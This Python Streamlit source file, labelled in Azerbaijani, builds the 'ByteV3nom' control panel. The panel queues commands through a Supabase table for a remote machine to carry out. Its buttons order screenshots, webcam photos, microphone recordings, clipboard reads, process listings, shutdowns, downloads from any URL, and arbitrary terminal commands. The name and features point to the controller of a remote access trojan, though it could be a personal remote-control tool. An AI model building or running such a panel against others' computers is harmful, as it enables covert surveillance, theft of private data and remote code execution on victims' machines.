import os
import streamlit as st
from supabase import create_client, Client

URL = os.environ.get("SUPABASE_URL", "https://sfshteybktaruvawmmsb.supabase.co")
KEY = os.environ.get("SUPABASE_KEY")

st.set_page_config(page_title="ByteV3nom Control Center", layout="wide", page_icon="🐍")
st.title("🐍 ByteV3nom - Mega Ultimate Uzaqdan İdarəetmə Mərkəzi")

if not KEY:
    st.error("⚠️ SUPABASE_KEY təyin edilməyib! Render-də Environment Variables hissəsini yoxlayın.")
    st.stop()

supabase: Client = create_client(URL, KEY)

def send_cmd(cmd):
    try:
        supabase.table("commands").insert({"command": cmd}).execute()
        st.toast(f"✅ Əmr göndərildi: {cmd}", icon="⚡")
    except Exception as e:
        st.error(f"Xəta: {e}")

# Sidebar - Sürətli Əmrlər
st.sidebar.title("🎮 Sürətli İdarə")
if st.sidebar.button("📸 Ekran Şəkli (Screenshot)", use_container_width=True):
    send_cmd("screenshot")
if st.sidebar.button("📷 Kamera Şəkli (Webcam)", use_container_width=True):
    send_cmd("webcam")
if st.sidebar.button("🔒 Ekranı Kilidlə", use_container_width=True):
    send_cmd("lock")
if st.sidebar.button("🌙 Yuxu Rejimi (Sleep)", use_container_width=True):
    send_cmd("sleep")

st.sidebar.divider()
st.sidebar.subheader("🎙️ Səsli Oxuma (TTS)")
tts_text = st.sidebar.text_input("Mətn daxil edin:", "ByteV3nom sistemi aktivdir")
if st.sidebar.button("🔊 Mətni Oxu", use_container_width=True):
    send_cmd(f"say {tts_text}")

# Tablar - Bütün Funksionallıq
tab1, tab2, tab3, tab4, tab5 = st.tabs([
    "🖥️ Sistem & Güc", 
    "🎵 Media & Səs", 
    "🌐 Brauzer & Şəbəkə", 
    "🎙️ Mikrofon & Fayllar", 
    "⚡ Terminal & AI"
])

with tab1:
    col1, col2, col3 = st.columns(3)
    with col1:
        if st.button("📊 Sistem Statusu", use_container_width=True): send_cmd("sysinfo")
        if st.button("🔋 Batareya Məlumatı", use_container_width=True): send_cmd("battery")
    with col2:
        if st.button("📋 Clipboard Oxu", use_container_width=True): send_cmd("clipget")
        if st.button("📝 İşləyən Proseslər", use_container_width=True): send_cmd("proc")
    with col3:
        if st.button("🛑 Kompüteri Söndür (30s)", use_container_width=True): send_cmd("shutdown")
        if st.button("🔄 Yenidən Başlat (Restart)", use_container_width=True): send_cmd("restart")

with tab2:
    st.subheader("🔊 Səs və Parlaqlıq")
    vol = st.slider("Səs Səviyyəsi (%)", 0, 100, 50)
    if st.button("Səsi Tənzimlə"): send_cmd(f"volume {vol}")
    
    st.divider()
    st.subheader("🎵 Media İdarəetməsi")
    m_col1, m_col2, m_col3, m_col4 = st.columns(4)
    with m_col1:
        if st.button("⏯️ Başlat/Saxla", use_container_width=True): send_cmd("media play_pause")
    with m_col2:
        if st.button("⏭️ Növbəti", use_container_width=True): send_cmd("media next")
    with m_col3:
        if st.button("⏮️ Əvvəlki", use_container_width=True): send_cmd("media prev")
    with m_col4:
        if st.button("⏹️ Dayandır", use_container_width=True): send_cmd("media stop")

with tab3:
    st.subheader("🌐 Brauzer İdarəsi")
    b_col1, b_col2 = st.columns(2)
    with b_col1:
        search_q = st.text_input("Google-da Axtar:")
        if st.button("🔍 Axtar"): send_cmd(f"search {search_q}")
    with b_col2:
        yt_q = st.text_input("YouTube-da Axtar:")
        if st.button("▶️ YouTube-da Tap"): send_cmd(f"youtube {yt_q}")
    
    st.divider()
    w_col1, w_col2 = st.columns(2)
    with w_col1:
        if st.button("📶 Wi-Fi Aç", use_container_width=True): send_cmd("wifi on")
    with w_col2:
        if st.button("📵 Wi-Fi Bağla", use_container_width=True): send_cmd("wifi off")

with tab4:
    st.subheader("🎙️ Mikrofon Qeydi")
    rec_sec = st.number_input("Qeyd müddəti (saniyə):", min_value=1, max_value=60, value=5)
    if st.button("🔴 Səs Yazın"): send_cmd(f"record {rec_sec}")
    
    st.divider()
    st.subheader("📥 Fayl Yükləyici")
    file_url = st.text_input("Yüklənəcək Faylın URL-i:")
    if st.button("⬇️ Kompüterə Endir"): send_cmd(f"download {file_url}")

with tab5:
    st.subheader("💻 Terminal / CMD Əmri")
    cmd_input = st.text_input("İcra olunacaq komanda (məsələn: ipconfig /all):")
    if st.button("⚡ Əmri İcra Et"): send_cmd(f"run {cmd_input}")

st.divider()
st.subheader("📋 Son Göndərilən Əmrlər")
try:
    response = supabase.table("commands").select("*").order("created_at", desc=True).limit(10).execute()
    st.dataframe(response.data, use_container_width=True)
except Exception as e:
    st.error(f"Məlumat oxunarkən xəta: {e}")
